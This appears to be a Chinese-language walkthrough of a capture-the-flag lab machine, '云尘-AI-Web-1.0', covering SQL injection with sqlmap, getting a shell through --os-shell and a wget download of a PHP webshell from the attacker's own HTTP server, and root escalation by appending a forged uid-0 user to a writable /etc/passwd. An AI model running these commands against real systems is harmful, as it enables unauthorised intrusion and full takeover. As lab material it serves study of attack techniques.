# 云尘-AI-Web-1.0

继续！

开扫



<img src="https://i-blog.csdnimg.cn/blog_migrate/da962ffbb2dbc11751a5eb1a542e480d.png" alt="" style="max-height:172px; box-sizing:content-box;" />


继续先测试web



<img src="https://i-blog.csdnimg.cn/blog_migrate/fd6b1ca5b32827cc889c3b5e6c45d685.png" alt="" style="max-height:138px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/3a149f09da38dbc1bd3ef899aa45d680.png" alt="" style="max-height:350px; box-sizing:content-box;" />


sql注入直接sqlmap跑

通过注入 （sqlmap查询方式省略）



<img src="https://i-blog.csdnimg.cn/blog_migrate/a710e882950c2a0291be13e2ab49a862.png" alt="" style="max-height:235px; box-sizing:content-box;" />


存在systemuser 不知道会不会是电脑的密码 我们解密一下然后直接试试看

然后失败 这里就没有思路了 但是我们刚刚存在一个目录 我们再扫扫看

无果 换另一个目录

扫出来了 /m3diNf0/info.php 去看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/4cb1ab154305467b6af19ad3d3d8f558.png" alt="" style="max-height:478px; box-sizing:content-box;" />


这下就开朗了

因为这里可以获取 绝对路径 那么我们就可以直接通过 sqlmap进行getshell 这里介绍三种

## 第一种 --os-shell

```cobol
/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9e8b50362c8ba3db6a0cfea1b353c61d.png" alt="" style="max-height:471px; box-sizing:content-box;" />


我们就getshell了

## 第二种  --file-write

一样是通过sqlmap

来上传文件 首先写一个木马

然后通过

```erlang
--file-write 木马文件 --file-dest 存放目录
```

上传文件

```cobol
py3 .\sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --file-write C:\Users\Administrator\Desktop\1.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/1.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b69ab9364874a5b542fa457e82ca8adb.png" alt="" style="max-height:286px; box-sizing:content-box;" />


上传失败 但是学到了

## 第三种 wegt

首先就是本机开启web服务

用py即可

```cobol
py3 -m http.server 8888
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4ae84508b79bebae522bec84d54d2f33.png" alt="" style="max-height:904px; box-sizing:content-box;" />


开启 服务后 去sqlmap的shell 中下载即可

```cobol
 wget http://10.8.0.174:8888//1.php
```

这里因为是靶场 所以找不到本身 的ip 后面发现在openvpn里存在



<img src="https://i-blog.csdnimg.cn/blog_migrate/49ce12b61fcb26c3a966fde9a6e10afe.png" alt="" style="max-height:109px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/9539f94c5fd763c8b1a0cbf31b3fe117.png" alt="" style="max-height:227px; box-sizing:content-box;" />


这里就成功

然后我们链接后查看一下 如何提权

首先就是查看/etc/passwd的权限

```cobol
-rw-r--r-- 1 www-data www-data 1664 Aug 21  2019 /etc/passwd
```

发现 有w 可写 那么我们就通过openssl伪造一下

```cobol
openssl passwd -1 -salt hack 123456
```

然后我们看看root怎么写的

```ruby
root:x:0:0:root:/root:/bin/bash
 
x为密码 就是上面生成的
 
hack:$1$hack$.JxSX4bOP1WSqH0kCgs9Y.:0:0:root:/root:/bin/bash
```

然后通过echo写入

```typescript
echo 'hack:$1$hack$.JxSX4bOP1WSqH0kCgs9Y.:0:0::/root:/bin/bash' >> /etc/passwd
```

sudo hack 会报错



<img src="https://i-blog.csdnimg.cn/blog_migrate/323bc49d12d1f918082c059a0dcd316e.png" alt="" style="max-height:53px; box-sizing:content-box;" />


我们使用py命令

```rust
python -c 'import pty;pty.spawn("/bin/bash")'
```

但是最后无法实现 靶机被打坏了。。。。。